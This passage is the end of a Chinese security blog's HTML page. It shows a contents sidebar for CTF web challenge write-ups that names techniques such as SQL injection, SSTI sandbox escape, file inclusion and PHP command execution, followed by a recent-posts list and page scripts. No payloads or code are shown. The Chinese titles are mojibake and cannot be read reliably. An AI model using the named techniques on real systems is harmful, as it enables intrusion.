href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-text">æ€»ç»“ä¸€ä¸‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">å‚è€ƒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-cat%EF%BC%88Django%E5%AE%BD%E5%AD%97%E8%8A%82%E6%8A%A5%E9%94%99-php-curl-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-text">â­ catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™+php curl @è¯»å–æ–‡ä»¶ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-text">å‚è€ƒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-ics-05%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php-filter%E6%9C%AC%E5%9C%B0%E8%AF%BB%E5%8F%96-preg-replace-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-text">â­ ics-05ï¼ˆæ–‡ä»¶åŒ…å«+php:&#x2F;&#x2F;filteræœ¬åœ°è¯»å–+preg_replace()å‘½ä»¤æ‰§è¡Œï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83-2"><span class="toc-text">å‚è€ƒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-FlatScience%EF%BC%88SQLite%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5-python%E8%84%9A%E6%9C%AC%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="toc-text">â­ FlatScienceï¼ˆSQLiteå›æ˜¾æ³¨å…¥+pythonè„šæœ¬å¯†ç ç¢°æ’ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-bug%EF%BC%88%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-XFF%E4%BC%AA%E9%80%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%89"><span class="toc-text">â­ bugï¼ˆä»»æ„ç”¨æˆ·å¯†ç é‡ç½®+XFFä¼ªé€ +æ–‡ä»¶ä¸Šä¼ ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-shrine%EF%BC%88SSTI-url-for-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%89"><span class="toc-text">â­ shrineï¼ˆSSTI+url_for()æ²™ç›’é€ƒé€¸ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-Web2%EF%BC%88%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%EF%BC%89"><span class="toc-text">â­ Web2ï¼ˆç¨‹åºé€†å‘ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-PHP2%EF%BC%88phps%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F-URLencode%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">â­ PHP2ï¼ˆphpsæºç æ³„æ¼+URLencodeç»•è¿‡ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-NewsCenter%EF%BC%88%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">â­ NewsCenterï¼ˆå¸¸è§„SQLæ³¨å…¥ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-mfw%EF%BC%88-git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2-assert-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-text">â­ mfwï¼ˆ.gitæºç æ³„éœ²+assert()å‘½ä»¤æ‰§è¡Œï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-upload1%EF%BC%88%E5%89%8D%E7%AB%AFJS%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">â­ upload1ï¼ˆå‰ç«¯JSæ ¡éªŒç»•è¿‡ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-ics-04%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%B3%A8%E5%86%8C%E8%A6%86%E7%9B%96%EF%BC%89"><span class="toc-text">â­ ics-04ï¼ˆSQLæ³¨å…¥+æ³¨å†Œè¦†ç›–ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-unserialize3%EF%BC%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wakeup-%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">â­ unserialize3ï¼ˆphpååºåˆ—åŒ–__wakeup()ç»•è¿‡ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90-warmup%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-text">â­ warmupï¼ˆæ–‡ä»¶åŒ…å«ï¼‰</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/202110102133.html" title="ã€å·¥å…·ç¯‡ã€‘webEye - webèµ„äº§æ¢æµ‹å·¥å…·"><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-10-10_14-38-36.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ã€å·¥å…·ç¯‡ã€‘webEye - webèµ„äº§æ¢æµ‹å·¥å…·"/></a><div class="content"><a class="title" href="/post/202110102133.html" title="ã€å·¥å…·ç¯‡ã€‘webEye - webèµ„äº§æ¢æµ‹å·¥å…·">ã€å·¥å…·ç¯‡ã€‘webEye - webèµ„äº§æ¢æµ‹å·¥å…·</a><time datetime="2021-10-10T13:33:40.000Z" title="å‘è¡¨äº 2021-10-10 21:33:40">2021-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/202109202133.html" title="ã€å·¥å…·ç¯‡ã€‘ip2domain - æ‰¹é‡ipåæŸ¥åŸŸååŠå¤‡æ¡ˆä¿¡æ¯å·¥å…·"><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-18_16-41-34.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ã€å·¥å…·ç¯‡ã€‘ip2domain - æ‰¹é‡ipåæŸ¥åŸŸååŠå¤‡æ¡ˆä¿¡æ¯å·¥å…·"/></a><div class="content"><a class="title" href="/post/202109202133.html" title="ã€å·¥å…·ç¯‡ã€‘ip2domain - æ‰¹é‡ipåæŸ¥åŸŸååŠå¤‡æ¡ˆä¿¡æ¯å·¥å…·">ã€å·¥å…·ç¯‡ã€‘ip2domain - æ‰¹é‡ipåæŸ¥åŸŸååŠå¤‡æ¡ˆä¿¡æ¯å·¥å…·</a><time datetime="2021-09-20T13:33:40.000Z" title="å‘è¡¨äº 2021-09-20 21:33:40">2021-09-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/202109162133.html" title="ã€å·¥å…·ç¯‡ã€‘HunterExport - QAXå…¨çƒé¹°æ•°æ®æ‰¹é‡æŸ¥è¯¢å¯¼å‡ºå·¥å…·"><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2021-09-16_14-09-08.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ã€å·¥å…·ç¯‡ã€‘HunterExport - QAXå…¨çƒé¹°æ•°æ®æ‰¹é‡æŸ¥è¯¢å¯¼å‡ºå·¥å…·"/></a><div class="content"><a class="title" href="/post/202109162133.html" title="ã€å·¥å…·ç¯‡ã€‘HunterExport - QAXå…¨çƒé¹°æ•°æ®æ‰¹é‡æŸ¥è¯¢å¯¼å‡ºå·¥å…·">ã€å·¥å…·ç¯‡ã€‘HunterExport - QAXå…¨çƒé¹°æ•°æ®æ‰¹é‡æŸ¥è¯¢å¯¼å‡ºå·¥å…·</a><time datetime="2021-09-16T13:33:40.000Z" title="å‘è¡¨äº 2021-09-16 21:33:40">2021-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/20210152133.html" title="è§£å†³Python Classä¸­è¿›ç¨‹æ± Poolå¯¹è±¡æ— æ³•ä½œä¸ºç±»å±æ€§è¿›è¡Œä¼ é€’é—®é¢˜"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="è§£å†³Python Classä¸­è¿›ç¨‹æ± Poolå¯¹è±¡æ— æ³•ä½œä¸ºç±»å±æ€§è¿›è¡Œä¼ é€’é—®é¢˜"/></a><div class="content"><a class="title" href="/post/20210152133.html" title="è§£å†³Python Classä¸­è¿›ç¨‹æ± Poolå¯¹è±¡æ— æ³•ä½œä¸ºç±»å±æ€§è¿›è¡Œä¼ é€’é—®é¢˜">è§£å†³Python Classä¸­è¿›ç¨‹æ± Poolå¯¹è±¡æ— æ³•ä½œä¸ºç±»å±æ€§è¿›è¡Œä¼ é€’é—®é¢˜</a><time datetime="2021-01-05T13:33:40.000Z" title="å‘è¡¨äº 2021-01-05 21:33:40">2021-01-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/20201222133.html" title="Windowså’ŒLinuxä¸Šsocketçš„ç»ˆæ­¢é—®é¢˜ï¼ˆtime_waitï¼‰"><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110191908243.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windowså’ŒLinuxä¸Šsocketçš„ç»ˆæ­¢é—®é¢˜ï¼ˆtime_waitï¼‰"/></a><div class="content"><a class="title" href="/post/20201222133.html" title="Windowså’ŒLinuxä¸Šsocketçš„ç»ˆæ­¢é—®é¢˜ï¼ˆtime_waitï¼‰">Windowså’ŒLinuxä¸Šsocketçš„ç»ˆæ­¢é—®é¢˜ï¼ˆtime_waitï¼‰</a><time datetime="2020-12-02T13:33:40.000Z" title="å‘è¡¨äº 2020-12-02 21:33:40">2020-12-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Sma11New</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>